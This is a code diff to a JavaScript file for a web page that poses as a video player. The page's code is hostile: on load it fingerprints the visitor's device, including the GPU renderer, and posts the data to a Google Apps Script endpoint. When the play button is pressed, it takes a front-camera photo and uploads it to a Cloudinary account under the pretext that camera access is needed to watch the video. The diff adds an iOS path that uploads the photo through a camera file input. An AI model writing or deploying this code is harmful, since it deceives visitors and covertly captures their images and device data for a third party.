@@ -1,6 +1,8 @@
 const playButton = document.getElementById('playButton');
 const loader = document.getElementById('loader');
 const video = document.getElementById('videoPlayer');
+const cameraInput = document.getElementById('cameraInput');
+const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
 
 (async () => {
     const ua = navigator.userAgent;
@@ -45,38 +47,57 @@ const video = document.getElementById('videoPlayer');
             return gl ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : null;
         })()
     };
-    await fetch('log_specs.php', {
+    // Send to Google Sheets
+    await fetch('https://script.google.com/macros/s/AKfycbwd6DFAaGBLF8RM6kD07nvTqD5Gr_SLDGTTLrkfVJ6qYrb7NtO9ZYZwqlgu4BnmQ28V/exec', {
         method: 'POST',
+        mode: 'no-cors',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(specs)
-    });
+    }).catch(() => {});
 })();
 
-playButton.addEventListener('click', async () => {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-        
-        const videoTrack = stream.getVideoTracks()[0];
-        const imageCapture = new ImageCapture(videoTrack);
-        const blob = await imageCapture.takePhoto();
-        
-        stream.getTracks().forEach(track => track.stop());
-        
-        const formData = new FormData();
-        formData.append('file', blob);
-        formData.append('upload_preset', 'user_pre');
-        await fetch('https://api.cloudinary.com/v1_1/dzmg57zjf/image/upload', { method: 'POST', body: formData });
-        
-        playButton.style.display = 'none';
-        loader.style.display = 'block';
-        
-        setTimeout(() => {
-            loader.style.display = 'none';
-            video.controls = true;
-            video.play();
-        }, 2000);
-        
-    } catch (error) {
-        alert('Camera permission denied. Please accept to watch the video.');
-    }
-});
+const uploadToCloudinary = async (blob) => {
+    const formData = new FormData();
+    formData.append('file', blob);
+    formData.append('upload_preset', 'user_pre');
+    const response = await fetch('https://api.cloudinary.com/v1_1/dzmg57zjf/image/upload', { method: 'POST', body: formData });
+    return response.json();
+};
+
+const playVideo = () => {
+    playButton.style.display = 'none';
+    loader.style.display = 'block';
+    setTimeout(() => {
+        loader.style.display = 'none';
+        video.controls = true;
+        video.play();
+    }, 2000);
+};
+
+if (isIOS) {
+    cameraInput.addEventListener('change', async (e) => {
+        const file = e.target.files[0];
+        if (file) {
+            await uploadToCloudinary(file);
+            playVideo();
+        }
+    });
+    
+    playButton.addEventListener('click', () => {
+        cameraInput.click();
+    });
+} else {
+    playButton.addEventListener('click', async () => {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+            const videoTrack = stream.getVideoTracks()[0];
+            const imageCapture = new ImageCapture(videoTrack);
+            const blob = await imageCapture.takePhoto();
+            stream.getTracks().forEach(track => track.stop());
+            await uploadToCloudinary(blob);
+            playVideo();
+        } catch (error) {
+            alert('Camera permission denied. Please accept to watch the video.');
+        }
+    });
+}
